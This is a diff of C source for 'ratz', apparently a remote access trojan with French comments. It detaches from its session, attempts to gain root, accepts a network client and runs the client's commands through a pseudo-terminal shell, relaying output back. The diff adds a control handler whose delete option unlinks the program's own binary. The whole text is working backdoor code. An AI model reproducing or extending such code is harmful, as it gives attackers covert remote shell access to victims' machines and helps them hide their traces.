@@ -16,7 +16,7 @@
 /*               `----'              `---'      `--`---'                               */
 /***************************************************************************************/
 
-# include "ratz.h"
+# include "ratz.h"	
 # include "slave.h"
 
 static int	cls = 0;
@@ -78,18 +78,18 @@ void	open_pts(s_blue* blue)
 }
 
 // Le terminal associé au 'fd' devient le terminal de controle de la session
-static inline
-int	set_ttctrl(int fd)
-{
-	return (ioctl(fd, TIOCSCTTY, 0));
-}
+//static inline
+//int	set_ttctrl(int fd)
+//{
+//	return (ioctl(fd, TIOCSCTTY, 0));
+//}
 
 void	setup_slave(s_blue* blue)
 {
 	if (setsid() == -1) // Détache le programme de l'ancienne session, auquel il devient maintenant le leader
 		blue->auth.setsid = 0;
 	open_pts(blue); // Ouvre le terminal esclave
-	if (set_ttctrl(blue->slave) == -1) // Le terminal associé au 'fd' devient le terminal de controle de la session
+	if (ioctl(blue->slave, TIOCSCTTY, 0) == -1) // Creation d'une nouvelle session
 		blue->auth.ioctl = 0;
 }
 
@@ -180,10 +180,47 @@ void	wait_new_connection(s_blue* blue)
 # ifdef DEBUG
 	P("wait new connection\n")
 # endif
+	printf("wait connection\n");
 	close(blue->client);
 	wait_connection(blue);
 	send_auth_error(*blue);
 }
+
+int	__opt(const char* test, const char* word, const char* longw)
+{
+	return ((!strcmp(test, word) || !strcmp(test, longw)));
+}
+
+int	ratz(s_blue* blue, char** av, char** opt)
+{
+	(void)blue;
+	(void)av;
+	(void)opt;
+	if (!strcmp(opt[0], "ratz"))
+	{
+		if (__opt(opt[1], "-q", "--quit"))
+			exit(0);
+		else if (__opt(opt[1], "-d", "--delete"))
+		{
+			if (fork() == 0)
+			{
+				unlink(av[0]);
+				exit(0);
+			}
+			else
+				exit(0);
+		}
+		else if (__opt(opt[1], "c", "--cpu"))
+		{
+			//if (opt[2] == NULL || atoi(opt[2]) == 0)
+			//	write(blue->client, itoa(nice(0)), strlen(itoa(nice(0))));
+		}
+		return (1);
+	}
+	return (0);
+}
+
+
 
 int	main(int unused, char** av)
 {
@@ -192,6 +229,7 @@ int	main(int unused, char** av)
 	s_blue	blue;
 	memset(&blue, 0, sizeof(blue));
 
+	setsid();
 	init_auth(&blue.auth);
 	try_set_root(&blue.auth);
 	blue.ratz.addr = get_own_addr();
@@ -223,6 +261,10 @@ int	main(int unused, char** av)
 		char	cmd[DEBUG_SIZE_MAX] = {0};	// 3 var for DEBUGGING
 		char*	tmp;
 		int		n = 0;
+		int		m = 0;
+		int		t = 0;
+
+		int		sync = 0;
 
 		fcntl(blue.client, F_SETFL, ~O_NONBLOCK);
 		fcntl(blue.master, F_SETFL, ~O_NONBLOCK);
@@ -233,51 +275,61 @@ int	main(int unused, char** av)
 # ifdef DEBUG
 	P("waiting...\n")
 # endif
-			n = read(blue.client, cmd, DEBUG_SIZE_MAX);
+			while ((n = read(blue.client, cmd, DEBUG_SIZE_MAX)) <= 0)
+				;
+			//n = read(blue.client, cmd, DEBUG_SIZE_MAX);
+			printf("cmd : %s\n", cmd);
+			//printf("n : %d | errno : %s\n", n, strerror(errno));
 			if (n <= 0 || !strcmp(cmd, "exit\n"))
 				wait_new_connection(&blue);
 			else
 			{
 				tmp = strdup(cmd);
 				n = sprintf(cmd, "kill -12 %d ; %s ; kill -10 %d\n", blue.pid, tmp, blue.pid);
+				m = n;
+				t = 0;
 				cmd[n] = 0;
 				//printf("cmd : %s\n", cmd);
 				
-				n = write(blue.master, cmd, n);
-# ifdef DEBUG
-	P("cmd start\n")
-# endif
+				write(blue.master, cmd, n);
 				while (cls == 0)
 					;
-				read(blue.master, cmd, n + 1);
-				n = 0;
-				fcntl(blue.master, F_SETFL, O_NONBLOCK);
-				while (clf == 0)
+				while (1)
 				{
-					//n = read(blue.master, cmd, DEBUG_SIZE_MAX);
-					//cmd[n] = '\0';	
-					//printf("n : %d\noutput : $%s$\n", n, cmd);
-					//if (n > 0)
+					if (t < m + 1)
+						t += read(blue.master, &cmd[t], (m + 1) - t);
+					else
+					{
+						fcntl(blue.master, F_SETFL, O_NONBLOCK);
+						n = read(blue.master, cmd, DEBUG_SIZE_MAX);
+						write(blue.client, cmd, n);
+					}
+					fcntl(blue.client, F_SETFL, O_NONBLOCK);
+					n = read(blue.client, cmd, DEBUG_SIZE_MAX);
+					fcntl(blue.client, F_SETFL, ~O_NONBLOCK);
+					//printf("n : %d | errno : %s\n", n, strerror(errno));
+					if (n > 0)
+					{
+						write(blue.master, cmd, n);
+						//exit(0);
+					}
+					if (clf == 1)
+					{
+						clf = 0;
+						cls = 0;
+						break;
+						//sync = 1;
+					}
+					//else if (sync == 1)
 					//{
-					//	if (write(blue.client, cmd, n) <= 0)
-					//		wait_new_connection(&blue);
+					//	break;
 					//}
 				}
-# ifdef DEBUG
-	P("cmd end\n")
-# endif
-				n = read(blue.master, cmd, DEBUG_SIZE_MAX);
-				cmd[n] = '\0';
-				if (n > 0)
-				{
-					if (write(blue.client, cmd, n) <= 0)
-						wait_new_connection(&blue);
-				}
-				else if (write(blue.client, "\001", 2) <= 0)
-					wait_new_connection(&blue);
+				n = 0;
+				printf("sortie\n");
 				fcntl(blue.master, F_SETFL, ~O_NONBLOCK);
-				cls = 0;
-				clf = 0;
+				fcntl(blue.client, F_SETFL, ~O_NONBLOCK);
+				write(blue.client, "\0033EONING\003", 10);
 			}
 		}
 	}
